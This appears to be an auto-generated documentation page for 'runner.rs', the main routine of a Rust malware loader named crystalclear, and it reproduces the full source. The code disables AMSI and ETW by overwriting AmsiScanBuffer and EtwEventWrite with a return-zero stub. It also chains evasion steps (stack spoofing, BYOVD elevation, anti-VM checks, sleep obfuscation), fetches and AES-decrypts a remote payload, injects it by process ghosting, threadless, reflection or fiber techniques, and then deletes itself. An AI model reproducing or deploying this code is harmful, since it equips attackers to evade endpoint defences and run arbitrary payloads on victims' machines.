# runner

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/runner.rs` |
| **Lines** | 265 |
| **Cards** | T022-architecture |
| **Role** | Multi-phase runner (0-6+) |
| **Unsafe blocks** | 6 |
| **Feature gates** | advanced_stack, veh_syscalls, byovd, anti_vm, hammering, iat_camou, ekko, amsi_bypass, threadless, self_delete, module_overload, ghosting, process_reflection, fiber |

## Constants

- `PATCH`: `[u8; 8]` = `[0x48, 0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90]`
- `PATCH`: `[u8; 8]` = `[0x48, 0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90]`

## Public API

### `run` (line 10)
```rust
pub fn run() -> Result<()>
```

## Internal Functions

- `dispatch_injection` (line 146)
- `patch_amsi` (line 215)
- `patch_etw` (line 242)

## Key Dependencies

- `use anyhow::{anyhow, Context, Result};`
- `use windows::core::PCSTR;`
- `use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};`
- `use windows::Win32::System::Memory::{`
- `use windows::Win32::System::Threading::GetCurrentProcess;`

## Full Source

```rust
use anyhow::{anyhow, Context, Result};
use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};
use windows::Win32::System::Threading::GetCurrentProcess;

pub fn run() -> Result<()> {
    let _debug_pause = crate::DebugPauseGuard;

    verbose_log!(
        "ENTRY: crystalclear iniciado (LOG_LEVEL={}, VERBOSE_DEBUG={})",
        crate::selection_config::log_level(),
        crate::selection_config::verbose_debug()
    );
    verbose_log!("FASE 0: preparando tabla de syscalls");
    let _ = crate::sysindirect_map::syscall_map();

    #[cfg(feature = "advanced_stack")]
    if crate::selection_config::enable_stack_spoof() {
        verbose_log!("FASE 0.5: inicializando Advanced Stack Spoofing");
        crate::evasion::advanced_stack::init(0);
    }

    verbose_log!(
        "FASE 1: modo de syscalls configurado como {}",
        crate::selection_config::syscall_mode()
    );

    #[cfg(feature = "veh_syscalls")]
    if crate::selection_config::syscall_mode() == "veh" {
        verbose_log!("FASE 1.1: inicializando VEH");
        unsafe {
            crate::evasion::veh::initialize_veh().context("Falla inicializando VEH")?;
        }
    }

    #[cfg(feature = "byovd")]
    if crate::selection_config::enable_byovd() {
        verbose_log!("FASE 2: intentando escalada BYOVD");
        crate::escalation::uac::attempt_silent_elevation()?;
    }

    #[cfg(feature = "byovd")]
    if crate::selection_config::enable_byovd() {
        verbose_log!("FASE 2.5: ejecutando blind run BYOVD");
        crate::evasion::byovd::execute_blind_run()?;
    }

    #[cfg(feature = "anti_vm")]
    if crate::selection_config::enable_anti_vm() {
        verbose_log!("FASE 3: comprobacion anti-VM");
        if crate::evade_vm::check_vm() {
            verbose_log!("FASE 3: VM detectada, saliendo");
            return Ok(());
        }
    }

    #[cfg(feature = "hammering")]
    if crate::selection_config::enable_api_hammering() {
        verbose_log!("FASE 4: API hammering activado");
        crate::api_hammering::hammer(crate::selection_config::syscall_seed());
    }

    #[cfg(feature = "iat_camou")]
    if crate::selection_config::enable_iat_camouflage() {
        verbose_log!(
            "FASE 5: aplicando IAT camouflage perfil {}",
            crate::selection_config::iat_profile()
        );
        crate::iat_camouflage::apply_camouflage(crate::selection_config::iat_profile());
    }

    #[cfg(feature = "ekko")]
    if crate::selection_config::enable_ekko() {
        verbose_log!("FASE 6: aplicando sleep obfuscation");
        crate::ekko_variants::ekko_sleep_dynamic(2000);
    }

    #[cfg(feature = "amsi_bypass")]
    if crate::selection_config::enable_amsi_hbp() {
        verbose_log!("FASE 7: instalando AMSI HBP");
        crate::amsi_hbp::install_amsi_hbp();
    }

    #[cfg(feature = "threadless")]
    if crate::selection_config::enable_threadless() {
        verbose_log!("FASE 7.5: threadless clean stubs AMSI/ETW");
        unsafe {
            let h = GetCurrentProcess();
            let amsi_ok = crate::injection::threadless::install_clean_stub(
                h,
                "amsi.dll",
                crate::selection_config::threadless_target_export(),
            );
            let etw_ok =
                crate::injection::threadless::install_clean_stub(h, "ntdll.dll", "EtwEventWrite");
            if !(amsi_ok && etw_ok) {
                let _ = patch_etw();
                let _ = patch_amsi();
            }
        }
    } else {
        let _ = patch_etw();
        let _ = patch_amsi();
    }

    verbose_log!("FASE 8: obteniendo payload");
    let encrypted_payload = crate::transport::get_payload()?;

    let mut decrypted_payload = crate::crypto::decrypt_payload(
        &encrypted_payload,
        crate::selection_config::aes_key_raw(),
        crate::selection_config::aes_iv_raw(),
    )?;
    verbose_log!(
        "FASE 9: payload descifrado ({} bytes)",
        decrypted_payload.len()
    );

    if crate::selection_config::mock_shellcode() {
        verbose_log!("FASE 10: MOCK_SHELLCODE activo, se omite la inyeccion real.");
    } else {
        verbose_log!(
            "FASE 10: dispatch de inyeccion (PE={})",
            crate::selection_config::is_pe_payload()
        );
        dispatch_injection(&decrypted_payload)?;
    }

    verbose_log!("FASE 11: limpieza de memoria");
    crate::crypto::secure_zero_memory(&mut decrypted_payload);
    drop(decrypted_payload);

    #[cfg(feature = "self_delete")]
    if crate::selection_config::enable_self_delete() {
        verbose_log!("FASE 12: self-delete habilitado");
        let _ = crate::self_deletion::delete_self();
    }

    Ok(())
}

fn dispatch_injection(payload: &[u8]) -> Result<()> {
    if crate::selection_config::is_pe_payload() {
        #[cfg(feature = "module_overload")]
        {
            if crate::selection_config::enable_module_overload() {
                verbose_log!("dispatch_injection: intentando module overloading");
                let target_dll = crate::selection_config::overload_target_dll();
                let module = crate::loader::module_overload::Module::new(
                    payload.to_vec(),
                    "".to_string(),
                    target_dll.to_string(),
                )
                .map_err(|e| anyhow!("Module::new failed: {:?}", e))?;
                if module.run().is_ok() {
                    return Ok(());
                }
            }
        }

        #[cfg(feature = "ghosting")]
        {
            verbose_log!("dispatch_injection: intentando process ghosting");
            if crate::process_ghosting::try_process_ghosting(payload) {
                return Ok(());
            }
        }
    } else {
        #[cfg(feature = "threadless")]
        {
            if crate::selection_config::enable_threadless() {
                verbose_log!("dispatch_injection: intentando threadless injection");
                unsafe {
                    let h_process = windows::Win32::System::Threading::GetCurrentProcess();
                    if crate::injection::threadless::try_threadless_inject(
                        h_process,
                        "amsi.dll",
                        crate::selection_config::threadless_target_export(),
                        payload,
                    ) {
                        return Ok(());
                    }
                }
            }
        }

        #[cfg(feature = "process_reflection")]
        {
            if crate::selection_config::enable_process_reflection() {
                verbose_log!("dispatch_injection: intentando process reflection");
                unsafe {
                    let pid = windows::Win32::System::Threading::GetCurrentProcessId();
                    if crate::injection::process_reflection::try_process_reflection(pid, payload) {
                        return Ok(());
                    }
                }
            }
        }

        #[cfg(feature = "fiber")]
        {
            verbose_log!("dispatch_injection: intentando fiber injection");
            if crate::fiber_inject::try_fiber_inject(payload) {
                return Ok(());
            }
        }
    }
    Err(anyhow!("Todas las rutas de inyeccion fallaron"))
}

fn patch_amsi() -> Result<()> {
    unsafe {
        let mut amsi = GetModuleHandleA(PCSTR(b"amsi.dll\0".as_ptr()));
        if amsi.is_err() {
            amsi = LoadLibraryA(PCSTR(b"amsi.dll\0".as_ptr()));
        }
        if let Ok(amsi) = amsi {
            if let Some(target) = GetProcAddress(amsi, PCSTR(b"AmsiScanBuffer\0".as_ptr())) {
                let mut old = PAGE_PROTECTION_FLAGS(0);
                const PATCH: [u8; 8] = [0x48, 0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90];
                if VirtualProtect(
                    target as *const c_void,
                    PATCH.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut old,
                )
                .is_ok()
                {
                    std::ptr::copy_nonoverlapping(PATCH.as_ptr(), target as *mut u8, PATCH.len());
                    let _ = VirtualProtect(target as *const c_void, PATCH.len(), old, &mut old);
                }
            }
        }
        Ok(())
    }
}

fn patch_etw() -> Result<()> {
    unsafe {
        let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()))
            .or_else(|_| LoadLibraryA(PCSTR(b"ntdll.dll\0".as_ptr())));
        if let Ok(ntdll) = ntdll {
            if let Some(target) = GetProcAddress(ntdll, PCSTR(b"EtwEventWrite\0".as_ptr())) {
                let mut old = PAGE_PROTECTION_FLAGS(0);
                const PATCH: [u8; 8] = [0x48, 0x31, 0xC0, 0xC3, 0x90, 0x90, 0x90, 0x90];
                if VirtualProtect(
                    target as *const c_void,
                    PATCH.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut old,
                )
                .is_ok()
                {
                    std::ptr::copy_nonoverlapping(PATCH.as_ptr(), target as *mut u8, PATCH.len());
                    let _ = VirtualProtect(target as *const c_void, PATCH.len(), old, &mut old);
                }
            }
        }
        Ok(())
    }
}

```